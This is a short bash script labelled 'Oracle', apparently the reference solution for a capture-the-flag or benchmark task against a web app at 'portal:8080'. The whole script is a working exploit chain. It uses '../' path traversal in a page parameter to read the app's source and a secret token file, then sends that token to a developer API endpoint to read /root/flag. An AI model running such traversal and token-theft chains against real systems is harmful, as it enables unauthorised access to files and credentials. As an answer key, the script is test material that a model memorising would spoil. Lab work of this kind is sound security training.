#!/usr/bin/env bash
# Oracle: read app source via LFI to learn the chain, read token via LFI, call /api/dev.
set -euo pipefail
B=http://portal:8080
echo "== source (first lines) =="
curl -s "$B/page?name=../../../../app/app.py" | head -20
echo "== token =="
TOKEN=$(curl -s "$B/page?name=../../../../etc/portal/token")
echo "token: $TOKEN"
echo "== flag =="
curl -s "$B/api/dev?path=/root/flag" -H "X-Dev-Token: $TOKEN"
